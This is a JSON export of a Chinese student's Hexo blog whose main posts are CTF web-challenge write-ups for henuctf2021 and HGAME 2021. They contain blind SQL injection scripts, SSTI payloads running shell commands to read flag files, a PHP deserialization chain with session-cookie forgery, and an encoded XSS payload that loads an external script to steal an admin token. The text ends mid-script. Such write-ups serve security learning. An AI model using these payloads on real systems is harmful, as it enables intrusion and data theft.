{"meta":{"title":"Troy3e","subtitle":null,"description":null,"author":"Troye","url":""},"pages":[{"title":"about","date":"2018-12-12T14:14:36.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"about/index.html","permalink":"/about/index.html","excerpt":"","text":"[さくら荘のhojun] 与&nbsp; Mashiro&nbsp; （ 真（ま）白（しろ） ） 对话中... bot_ui_ini()","keywords":"关于"},{"title":"bangumi","date":"2019-02-10T13:32:48.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"bangumi/index.html","permalink":"/bangumi/index.html","excerpt":"","text":"","keywords":null},{"title":"categories","date":"2019-11-22T03:22:38.000Z","updated":"2019-11-22T03:23:51.477Z","comments":true,"path":"categories/index.html","permalink":"/categories/index.html","excerpt":"","text":""},{"title":"client","date":"2018-12-20T15:13:35.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"client/index.html","permalink":"/client/index.html","excerpt":"","text":"直接下载 or 扫码下载：","keywords":"Android客户端"},{"title":"comment","date":"2018-12-20T15:13:48.000Z","updated":"2019-11-16T09:29:49.000Z","comments":true,"path":"comment/index.html","permalink":"/comment/index.html","excerpt":"","text":"念两句诗 叙别梦、扬州一觉。 【宋代】吴文英《夜游宫·人去西楼雁杳》","keywords":"留言板"},{"title":"donate","date":"2018-12-20T15:13:05.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"donate/index.html","permalink":"/donate/index.html","excerpt":"","text":"","keywords":"谢谢饲主了喵~"},{"title":"lab","date":"2019-01-05T13:47:59.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"lab/index.html","permalink":"/lab/index.html","excerpt":"","text":"sakura主题balabala","keywords":"Lab实验室"},{"title":"links","date":"2018-12-19T15:11:06.000Z","updated":"2019-11-16T09:29:49.000Z","comments":true,"path":"links/index.html","permalink":"/links/index.html","excerpt":"","text":"","keywords":"友人帐"},{"title":"music","date":"2018-12-20T15:14:28.000Z","updated":"2020-12-05T14:46:35.710Z","comments":false,"path":"music/index.html","permalink":"/music/index.html","excerpt":"","text":"","keywords":"喜欢的音乐"},{"title":"photo","date":"2019-11-22T09:24:55.000Z","updated":"2019-11-22T09:24:55.430Z","comments":true,"path":"photo/index.html","permalink":"/photo/index.html","excerpt":"","text":""},{"title":"rss","date":"2018-12-20T15:09:03.000Z","updated":"2019-11-16T09:29:49.000Z","comments":true,"path":"rss/index.html","permalink":"/rss/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-12-12T14:14:16.000Z","updated":"2019-11-16T09:29:49.000Z","comments":true,"path":"tags/index.html","permalink":"/tags/index.html","excerpt":"","text":""},{"title":"theme-sakura","date":"2019-01-04T14:53:25.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"theme-sakura/index.html","permalink":"/theme-sakura/index.html","excerpt":"","text":"Hexo主题Sakura修改自WordPress主题Sakura，感谢原作者Mashiro","keywords":"Hexo 主题 Sakura 🌸"},{"title":"video","date":"2018-12-20T15:14:38.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"video/index.html","permalink":"/video/index.html","excerpt":"","text":"var videos = [ { img: 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '放送时间: 2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' }, { img : 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' } ] .should-ellipsis{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:95%;}.should-ellipsis-full{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:100%;}.should-ellipsis i{position:absolute;right:24px;}.grey-text{color:#9e9e9e !important}.grey-text.text-darken-4{color:#212121 !important}html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}img{border-style:none}progress{display:inline-block;vertical-align:baseline}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{-webkit-box-sizing:border-box;box-sizing:border-box}*,*:before,*:after{-webkit-box-sizing:inherit;box-sizing:inherit}ul:not(.browser-default){padding-left:0;list-style-type:none}ul:not(.browser-default)>li{list-style-type:none}.card{-webkit-box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2);box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2)}.hoverable{-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s}.hoverable:hover{-webkit-box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19)}i{line-height:inherit}i.right{float:right;margin-left:15px}.bangumi .right{float:right !important}.material-icons{text-rendering:optimizeLegibility;-webkit-font-feature-settings:'liga';-moz-font-feature-settings:'liga';font-feature-settings:'liga'}.row{margin-left:auto;margin-right:auto;margin-bottom:20px}.row:after{content:\"\";display:table;clear:both}.row .col{float:left;-webkit-box-sizing:border-box;box-sizing:border-box;padding:0 .75rem;min-height:1px}.row .col.s12{width:100%;margin-left:auto;left:auto;right:auto}@media only screen and (min-width:601px){.row .col.m6{width:50%;margin-left:auto;left:auto;right:auto}}html{line-height:1.5;font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Oxygen-Sans,Ubuntu,Cantarell,\"Helvetica Neue\",sans-serif;font-weight:normal;color:rgba(0,0,0,0.87)}@media only screen and (min-width:0){html{font-size:14px}}@media only screen and (min-width:992px){html{font-size:14.5px}}@media only screen and (min-width:1200px){html{font-size:15px}}.card{position:relative;margin:.5rem 0 1rem 0;background-color:#fff;-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s;border-radius:2px}.card .card-title{font-size:24px;font-weight:300}.card .card-title.activator{cursor:pointer}.card .card-image{position:relative}.card .card-image img{display:block;border-radius:2px 2px 0 0;position:relative;left:0;right:0;top:0;bottom:0;width:100%}.card .card-content{padding:24px;border-radius:0 0 2px 2px}.card .card-content p{margin:0}.card .card-content .card-title{display:block;line-height:32px;margin-bottom:8px}.card .card-content .card-title i{line-height:32px}.card .card-reveal{padding:24px;position:absolute;background-color:#fff;width:100%;overflow-y:auto;left:0;top:100%;height:100%;z-index:3;display:none}.card .card-reveal .card-title{cursor:pointer;display:block}.waves-effect{position:relative;cursor:pointer;display:inline-block;overflow:hidden;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-tap-highlight-color:transparent;vertical-align:middle;z-index:1;-webkit-transition:.3s ease-out;transition:.3s ease-out}.waves-effect img{position:relative;z-index:-1}.waves-block{display:block}::-webkit-input-placeholder{color:#d1d1d1}::-moz-placeholder{color:#d1d1d1}:-ms-input-placeholder{color:#d1d1d1}::-ms-input-placeholder{color:#d1d1d1}[type=\"radio\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"radio\"]:not(:checked)+span{position:relative;padding-left:35px;cursor:pointer;display:inline-block;height:25px;line-height:25px;font-size:1rem;-webkit-transition:.28s ease;transition:.28s ease;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border-radius:50%}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border:2px solid #5a5a5a}[type=\"radio\"]:not(:checked)+span:after{-webkit-transform:scale(0);transform:scale(0)}[type=\"checkbox\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"checkbox\"]:not(:checked):disabled+span:not(.lever):before{border:none;background-color:rgba(0,0,0,0.42)}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):before{width:0;height:0;border:3px solid transparent;left:6px;top:10px;-webkit-transform:rotateZ(37deg);transform:rotateZ(37deg);-webkit-transform-origin:100% 100%;transform-origin:100% 100%}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):after{height:20px;width:20px;background-color:transparent;border:2px solid #5a5a5a;top:0px;z-index:0}input[type=checkbox]:not(:disabled) ~ .lever:active:before,input[type=checkbox]:not(:disabled).tabbed:focus ~ .lever::before{-webkit-transform:scale(2.4);transform:scale(2.4);background-color:rgba(0,0,0,0.08)}input[type=range].focused:focus:not(.active)::-webkit-slider-thumb{-webkit-box-shadow:0 0 0 10px rgba(38,166,154,0.26);box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-moz-range-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-ms-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)} 番组计划 这里将是永远的回忆 window.onload = function(){ videos.forEach(function(video, i){ $('#rootRow').append(` ${video.title} ${video.jp} ${video.status} ${video.title} ${video.jp} 放送时间: ${video.time} ${video.desc} ${video.status} `) }) }","keywords":"B站"},{"title":"welfare","date":"2019-11-22T09:25:13.000Z","updated":"2019-11-22T09:25:13.585Z","comments":true,"path":"welfare/index.html","permalink":"/welfare/index.html","excerpt":"","text":""}],"posts":[{"title":"Self-Introduction（置顶）","slug":"Self-Introduction","date":"2077-12-10T00:00:00.000Z","updated":"2020-12-09T15:54:30.864Z","comments":true,"path":"2077/12/10/Self-Introduction/","link":"","permalink":"/2077/12/10/Self-Introduction/","excerpt":"","text":"19级菜鸡CTF选手，专精Web但是还是个fw喜欢运动，打游戏，二次元不喜欢数学老婆是樱岛麻衣可以一起交流打比赛的师傅带带：qq 1220101668（持续更新","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[De1CTF 2019]ShellShellShell","slug":"De1CTF-2019-ShellShellShell","date":"2021-03-11T08:38:01.000Z","updated":"2021-03-11T08:41:13.256Z","comments":true,"path":"2021/03/11/De1CTF-2019-ShellShellShell/","link":"","permalink":"/2021/03/11/De1CTF-2019-ShellShellShell/","excerpt":"","text":"","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"henuctf2021-Web WP","slug":"henuctf2021-Web-WP","date":"2021-03-07T13:42:48.000Z","updated":"2021-03-09T08:06:02.362Z","comments":true,"path":"2021/03/07/henuctf2021-Web-WP/","link":"","permalink":"/2021/03/07/henuctf2021-Web-WP/","excerpt":"","text":"实验室内部比赛，四个Web，都没什么难度，但可能没有考虑到20的学习情况，所以相对而言出得确实稍微难了一点。 一、Find看了大家WP都是直接传flag.php的。。。 这题的本意其实完全不是这样的，当时出的快没细看，想着总得出一个php基础的题就想到了一个点，没想到大意了（不应该include flag.php的。。。 本题的考点就是用数组绕过is_file函数： name[]=1 也算一个比较有意思的点吧 记住就行。 二、Maiphp反序列化，没想到大家都没遇见过这种的。。。我记得buu上有很多反序列化的，可能是还没做到。 这道题稍微有点反序列化知识就能做，源码也很少。首先根据提示要先知道key，那么就需要触发toString魔法函数，我看到有些同学都在想办法把什么对象当字符串输出，没错这是触发toString的方法之一，但是在这里并没有机会。事实上，只要把对象当成字符串比较就能触发toString了。即我后来提示的wakeup函数的第一行。所以在construct函数中实例化baby类就行了。 POP链： &lt;?php class baby{ public $baby; } class flag{ public $baby; public function __construct(){ $this-&gt;baby = new baby(); } } $troy3e=new flag(); echo serialize($troy3e); ?&gt; 得到 O:4:&quot;flag&quot;:1:{s:4:&quot;baby&quot;;O:4:&quot;baby&quot;:1:{s:4:&quot;baby&quot;;N;}} 传参得key 令code等于key 传参得flag 最后总结下思路： flag类的$this-&gt;baby实例化为baby类 -&gt; Get传参henu触发反序列化 -&gt; 反序列化瞬间触发wakeup -&gt; wakeup函数中将对象当字符串比较触发baby类toString -&gt; 输出key 三、Love 和hgame week2 200ok!基本上一模一样的 估计大家都没看我发的wp吧。。。贴个脚本自己看吧出盲注确实有点离谱了，我是想着让大家复习一下hgame那道题的，没想到大家都没看，这种盲注大二之前尽量掌握。 import requests flag = &quot;&quot; url = &quot;http://henuctf.com:5555/Love/&quot; for i in range(1,1000): l = 28 h = 132 mid = (l + h) // 2 while(l&lt;h): #payload = &quot;1&#39;^(ord(mid(database(),{0},1))&gt;{1})^&#39;1&#39;#&quot;.format(i,mid) #payload = &quot;1&#39;^(ord(mid((seselectlect(group_concat(table_name))ffromrom(information_schema.tables)where(table_schema=&#39;test&#39;)),{0},1))&gt;{1})^&#39;1&#39;#&quot;.format(i, mid) #payload = &quot;1&#39;^(ord(mid((seselectlect(group_concat(column_name))ffromrom(information_schema.columns)where(table_name=&#39;flaghere&#39;)),{0},1))&gt;{1})^&#39;1&#39;#&quot;.format(i, mid) #payload = &quot;1&#39;^(ord(mid((seselectlect(group_concat(yourflag))ffromrom(test.flaghere)),{0},1))&gt;{1})^&#39;1&#39;#&quot;.format(i, mid) data={&quot;name&quot;:payload,&quot;submit&quot;:&quot;%E7%AB%8B%E5%8D%B3%E5%8C%B9%E9%85%8D&quot;} r = requests.post(url=url,data=data) #print(r.text) if &quot;樱岛麻衣&quot; in r.text: l = mid + 1 else: h = mid mid = (l + h) //2 flag +=chr(mid) print (flag) print (flag) 四、shop 这题是我前天buu上做到的 因为很简单就让永奇学长复现了环境 没想到大家也没遇见过。。。。确实是我的问题 这题很多人都做出来了 也就不多说了（因为已经被提示完了","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"HGAME-Web-Week3WP","slug":"HGAME-Web-Week3WP","date":"2021-02-20T15:05:32.000Z","updated":"2021-02-17T06:36:47.282Z","comments":true,"path":"2021/02/20/HGAME-Web-Week3WP/","link":"","permalink":"/2021/02/20/HGAME-Web-Week3WP/","excerpt":"","text":"一、Liki-Jail 只有一个登录框，输入啥都是返回相同的内容（除非有非法字符），初步猜测是时间盲注。 第一步，测一下可用的字符： 可以看到空格单引号都被过滤了，但是空格可以用/**/代替，单引号的话这里我用了转义符号，稍微解释一下：后台的语句大概是 select xxx from xxx where username=’Troy3e’ and password=’caibi’，这时，如果我们另username为Troy3e\\，password为 /**/or/**/sleep(2)# 那么原语句就变为 where username=&#39;Troy3e\\&#39; and password=&#39;/**/or/**/sleep(2)#&#39; 就相当于where username=’xxx’ or sleep(2)#，所以会延时两秒。 接下来就是普通盲注的思路了，脚本如下： import requests import datetime import time flag = &quot;&quot; url = &quot;https://jailbreak.liki.link/login.php&quot; for i in range(1,1000): l = 32 h = 128 mid = (l + h) // 2 while(l&lt;h): name = &quot;admin\\\\&quot; #payload = &quot;/**/or/**/if((ascii(substr(database(),{0},1)))&gt;{1},1,sleep(2))#&quot;.format(i,mid) #库名为week3sqli #payload = &quot;/**/or/**/if((ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema/**/like/**/database())),{0},1))&gt;{1}),1,sleep(2))#&quot;.format(i,mid) #表名为u5ers #payload = &quot;/**/or/**/if((ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name/**/like/**/0x7535657273)),{0},1))&gt;{1}),1,sleep(2))#&quot;.format(i,mid) #列名为usern@me,p@ssword #payload = &quot;/**/or/**/if((ascii(substr((select(group_concat(`usern@me`))from(week3sqli.u5ers)),{0},1))&gt;{1}),1,sleep(2))#&quot;.format(i,mid) #用户名为admin payload = &quot;/**/or/**/if((ascii(substr((select(group_concat(`p@ssword`))from(week3sqli.u5ers)),{0},1))&gt;{1}),1,sleep(2))#&quot;.format(i,mid) #密码为sOme7hiNgseCretw4sHidd3n data = {&quot;username&quot;:name,&quot;password&quot;:payload} time1 = datetime.datetime.now() r = requests.post(url=url,data=data) time2 = datetime.datetime.now() sec = (time2 - time1).seconds if sec&lt;=1: l = mid + 1 else: h = mid mid = (l + h) // 2 flag += chr(mid) print(flag) print(flag) 有三个小点讲一下：1、等号=被过滤，我们可以使用like绕过。2、等号后面的单引号被过滤，我们用十六进制代替。3、usern@me和p@ssword加反引号的原因是@是mysql的特殊字，需要用反引号包围，否则跑不出来，可以自己试一下。 拿到账号密码登录： hgame{7imeB4se_injeCti0n+hiDe~th3^5ecRets} 二、Forgetful 一个非常简单的SSTI，一分钟就秒了。（不知道SSTI的务必百度自学一下，这个东西比赛很常见） 之前NCTF的payload直接就打通了：https://troyess.com/2020/11/23/NCTF2020%E7%AD%BE%E5%88%B0%E6%91%B8%E9%B1%BC/ 查看目录： {{\"\"[\"\\x5f\\x5fcla\"+\"ss\\x5f\\x5f\"][\"\\x5f\\x5fm\"+\"ro\\x5f\\x5f\"][1][\"\\x5f\\x5fsub\\x63lasses\\x5f\\x5f\"]()[117][\"\\x5f\\x5fin\"+\"it\\x5f\\x5f\"][\"\\x5f\\x5fglo\"+\"bals\\x5f\\x5f\"][\"popen\"](\"dir /\")[\"read\"]()}} 尝试读取flag： {{\"\"[\"\\x5f\\x5fcl\\x61ss\\x5f\\x5f\"][\"\\x5f\\x5fb\\x61ses\\x5f\\x5f\"][0][\"\\x5f\\x5fsubcla\" \"sses\\x5f\\x5f\"]()[166][\"\\x5f\\x5fini\\x74\\x5f\\x5f\"][\"\\x5f\\x5fglob\\x61ls\\x5f\\x5f\"][\"\\x5f\\x5fbuiltins\\x5f\\x5f\"][\"eval\"](\"\\x5f\\x5fimport\\x5f\\x5f(\\x27os\\x27)\\x2epopen(\\x27cat /flag\\x27)\\x2eread()\")}} 返回”Stop!!!”，读取失败，测试多次后猜测只要直接返回了flag里的内容就会阻止你读取。既然不能直接读，那就间接呗： {{\"\"[\"\\x5f\\x5fcl\\x61ss\\x5f\\x5f\"][\"\\x5f\\x5fb\\x61ses\\x5f\\x5f\"][0][\"\\x5f\\x5fsubcla\" \"sses\\x5f\\x5f\"]()[166][\"\\x5f\\x5fini\\x74\\x5f\\x5f\"][\"\\x5f\\x5fglob\\x61ls\\x5f\\x5f\"][\"\\x5f\\x5fbuiltins\\x5f\\x5f\"][\"eval\"](\"\\x5f\\x5fimport\\x5f\\x5f(\\x27os\\x27)\\x2epopen(\\x27cd ..;base64 flag\\x27)\\x2eread()\")}} hgame{h0w_4bou7+L3arn!ng~PythOn^Now?} 三、Post to zuckonit2.0 &amp; Post to zuckonit another version 发生甚么事了 四、Arknights 根据题目描述，本模拟器是用git搭建的，暗示存在git源码泄露。 Githack获取源码： 关键看simulator.php &lt;?php class Simulator{ public $session; public $cardsPool; public function __construct(){ $this-&gt;session = new Session(); if(array_key_exists(&quot;session&quot;, $_COOKIE)){ $this-&gt;session-&gt;extract($_COOKIE[&quot;session&quot;]); } $this-&gt;cardsPool = new CardsPool(&quot;./pool.php&quot;); $this-&gt;cardsPool-&gt;init(); } public function draw($count){ $result = array(); for($i=0; $i&lt;$count; $i++){ $card = $this-&gt;cardsPool-&gt;draw(); if($card[&quot;stars&quot;] == 6){ $this-&gt;session-&gt;set(&#39;&#39;, $card[&quot;No&quot;]); } $result[] = $card; } $this-&gt;session-&gt;save(); return $result; } public function getLegendary(){ $six = array(); $data = $this-&gt;session-&gt;getAll(); foreach ($data as $item) { $six[] = $this-&gt;cardsPool-&gt;cards[6][$item]; } return $six; } } class CardsPool { public $cards; private $file; public function __construct($filePath) { if (file_exists($filePath)) { $this-&gt;file = $filePath; } else { die(&quot;Cards pool file doesn&#39;t exist!&quot;); } } public function draw() { $rand = mt_rand(1, 100); $level = 0; if ($rand &gt;= 1 &amp;&amp; $rand &lt;= 42) { $level = 3; } elseif ($rand &gt;= 43 &amp;&amp; $rand &lt;= 90) { $level = 4; } elseif ($rand &gt;= 91 &amp;&amp; $rand &lt;= 99) { $level = 5; } elseif ($rand == 100) { $level = 6; } $rand_key = array_rand($this-&gt;cards[$level]); return array( &quot;stars&quot; =&gt; $level, &quot;No&quot; =&gt; $rand_key, &quot;card&quot; =&gt; $this-&gt;cards[$level][$rand_key] ); } public function init() { $this-&gt;cards = include($this-&gt;file); } public function __toString(){ return file_get_contents($this-&gt;file); } } class Session{ private $sessionData; const SECRET_KEY = &quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;; public function __construct(){} public function set($key, $value){ if(empty($key)){ $this-&gt;sessionData[] = $value; }else{ $this-&gt;sessionData[$key] = $value; } } public function getAll(){ return $this-&gt;sessionData; } public function save(){ $serialized = serialize($this-&gt;sessionData); $sign = base64_encode(md5($serialized . self::SECRET_KEY)); $value = base64_encode($serialized) . &quot;.&quot; . $sign; setcookie(&quot;session&quot;,$value); } public function extract($session){ $sess_array = explode(&quot;.&quot;, $session); $data = base64_decode($sess_array[0]); $sign = base64_decode($sess_array[1]); if($sign === md5($data . self::SECRET_KEY)){ $this-&gt;sessionData = unserialize($data); }else{ unset($this-&gt;sessionData); die(&quot;Go away! You hacker!&quot;); } } } class Eeeeeeevallllllll{ public $msg=&quot;坏坏liki到此一游&quot;; public function __destruct() { echo $this-&gt;msg; } } 首先找到获取flag的点： 有一个tostring魔法函数和file_get_contents函数，那么只要我们能控制file变量以及能够触发tostring函数，就可以读取flag.php。 这时注意到最后出题人留下的痕迹： 有一个echo，很明显是让你触发tostring的，所以只要令msg new一个类即可触发tostring，但是new哪一个类呢？肯定是能让我们控制file变量的CardsPool类了。 记得file前面一定改为public。。。private打不通，原因可能是%00在后面base64编码和md5加密的时候会出问题，可能是这样。 好的现在成功构造了pop链，但是没有反序列化点的话，都是徒劳的，也就是说还没有一个触发点。 Session类里有一个反序列化，能不能利用呢： 可以看到data就是我们session前半部分base64解码后的结果，所以说，是可控的。但是上面还有一个触发的条件，懒得细说了，上面secretkey已经给出，很好伪造，这里把脚本贴出来： &lt;?php highlight_file(__FILE__); class test { const SECRET_KEY = &quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;; public $data; function __destruct(){ $payload=&#39;O:17:&quot;Eeeeeeevallllllll&quot;:1:{s:3:&quot;msg&quot;;O:9:&quot;CardsPool&quot;:1:{s:4:&quot;file&quot;;s:10:&quot;./flag.php&quot;;}}&#39;; $sign=base64_encode(md5($payload . self::SECRET_KEY)); echo &#39;&lt;br/&gt;&#39;; echo $sign; echo &#39;&lt;br/&gt;&#39;; $key=base64_encode($payload); echo $key; echo &#39;&lt;br/&gt;&#39;; $value = base64_encode($payload) . &quot;.&quot; . $sign; $sess_array = explode(&quot;.&quot;, $value); echo &#39;&lt;br/&gt;&#39;; echo base64_decode($sess_array[0]); echo &#39;&lt;br/&gt;&#39;; echo base64_decode($sess_array[1]); echo &#39;&lt;br/&gt;&#39;; $a = base64_decode($sess_array[0]); $b = base64_decode($sess_array[1]); if($b === md5($a . self::SECRET_KEY)){ echo &quot;success&quot;; echo &#39;&lt;br/&gt;&#39;; } echo $value; } } $a=new test(); ?&gt; 脚本比较啰嗦，懒得改了。 将得到的payload放到session里面发送即可得到flag hgame{XI-4Nd-n!AN-D0e5Nt_eX|5T~4t_ALL}","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"HGAME-Web-Week2WP","slug":"HGAME-Web-Week2WP","date":"2021-02-13T12:20:38.000Z","updated":"2021-02-09T04:23:57.074Z","comments":true,"path":"2021/02/13/HGAME-Web-Week2WP/","link":"","permalink":"/2021/02/13/HGAME-Web-Week2WP/","excerpt":"","text":"一、LazyDogR4U www.zip源码泄露 一个session变量覆盖 获取flag的条件： 继续看到flag.php包含的lazy.php 此代码自行理解，建议本地试一试。 hgame{R4U~|S-4~lazy-DoG} 二、Post to zuckonit 经典xss，要获取管理员的token访问/flag。找一个xss平台准备接收tokenpayload： &lt;iframe srcdoc=。。。。。。。。。。&amp;#60;&amp;#115;&amp;#67;&amp;#82;&amp;#105;&amp;#80;&amp;#116;&amp;#32;&amp;#115;&amp;#82;&amp;#67;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#46;&amp;#112;&amp;#116;&amp;#47;&amp;#87;&amp;#106;&amp;#52;&amp;#67;&amp;#34;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#67;&amp;#114;&amp;#73;&amp;#112;&amp;#84;&amp;#62;&gt; xss就不解释了，一是姿势非常多，二是我自己也没怎么遇到过（啥也不会） payload准备好之后打给后台机器人就行，这里还有个验证码，python跑一个就行，网上嫖的脚本 稍微改了下（#py2）： import hashlib import random def encryption(chars): return hashlib.md5(chars).hexdigest() def generate(): code = &quot;&quot; for i in range(5): add_num = str(random.randrange(0,9))#纯数字 add_al = chr(random.randrange(65,91))#纯大写字母 add_str = str(random.randrange(0,9)) + chr (random.randrange(65,91))#数字和字母 sj = random.choice([add_str]) code = &quot;&quot;.join([sj,code]) return code def main(): start = &quot;6a506f&quot; #指定前六位 while True: strs = generate() print &quot;Test %s &quot; % strs if encryption(strs).startswith(start): print &quot;yes!&quot; print &quot;[+] %s &quot; % strs + &quot;%s &quot; % encryption(strs) break else: print &quot;no!&quot; if __name__ == &#39;__main__&#39;: main() print &#39;完成！&#39; 拿到token，访问/flag 三、200OK!! 乍一看不知道是考的啥东西，抓个包康康（burp抓https教程自行百度）： 在js脚本里面可以看到Status是随机生成的，在这里是一个可以控制的点，大概率存在sql注入。因为sql注入是寒假任务之一，所以我这里就一步一步写的细一点。 首先测试闭合的方式，1’时无回显，1’#时有回显，所以是单引号型的。 接下来我直接试了异或注入（记得加单引号，因为后台语句大概是这样的：select ‘(你的输入)’）：1’^’1’^’1’# 成功执行，存在异或注入。然后就是直接上二分法脚本了。 我先放脚本： import requests flag = &quot;&quot; url = &quot;https://200ok.liki.link/server.php&quot; for i in range(1,1000): l = 32 h = 132 mid = (l + h) // 2 while(l&lt;h): #payload = &quot;1&#39;^(ord(mid(database(),{0},1))&gt;{1})^&#39;1&#39;#&quot;.format(i, mid) #库名为 week2sqli #payload = &quot;1&#39;^(ord(mid((selselectect(group_concat(table_name))frfromom(information_schema.tables)wwherehere(table_schema=&#39;week2sqli&#39;)),{0},1))&gt;{1})^&#39;1&#39;#&quot;.format(i, mid) #表名为f1111111144444444444g #payload = &quot;1&#39;^(ord(mid((selselectect(group_concat(column_name))frfromom(information_schema.columns)wwherehere(table_name=&#39;f1111111144444444444g&#39;)),{0},1))&gt;{1})^&#39;1&#39;#&quot;.format(i, mid) #列名为ffffff14gggggg payload = &quot;1&#39;^(ord(mid((selselectect(group_concat(ffffff14gggggg))frfromom(week2sqli.f1111111144444444444g)),{0},1))&gt;{1})^&#39;1&#39;#&quot;.format(i, mid) #列名为ffffff14gggggg headers = { &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0&#39;, &#39;Status&#39;: payload } r = requests.get(url=url,headers=headers) print(r.text) if &#39;NETWORK ERROR&#39; in r.text: l = mid + 1 else: h = mid #if (mid == 32 or mid == 132): # break mid = (l + h) // 2 flag += chr(mid) print(flag) print(flag) 二分法脚本做buu的应该都已经遇到过了，所以就不细说了。唯一要说明的就是双写绕过以及是如何判断waf的。 在测试脚本的时候，我成功执行了第一个payload爆出了库名，于是直接进行了下一步爆表名，但是没有回显，测试payload如下： payload = 1&#39;^(ord(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;week2sqli&#39;)),1,1))&gt;1)^&#39;1&#39;# 照理说表名第一位的ascii码肯定大于一，所以这里应该返回NETWORK ERROR，但是却连200 OK都没有，所以肯定是语句存在问题了，而且是与第一个payload不一样的地方。 于是得一个个地测试，这里我用了length来判断：1’^(length(‘select’)=0)^’1’# 返回NETWORK ERROR，说明select长度为0，这也就表示了后台把select替换为空，所以双写绕过即可。from和where原理同上 hgame{Con9raTu1ati0n5+yoU_FXXK~Up-tH3,5Q1!!=)} 四、Liki的生日礼物这题找了好久不知道洞在哪，但是看solve数量那么多应该是个很简单的题，果然就是个竞争。python多线程同时买26张券即可。脚本: import requests import threading def 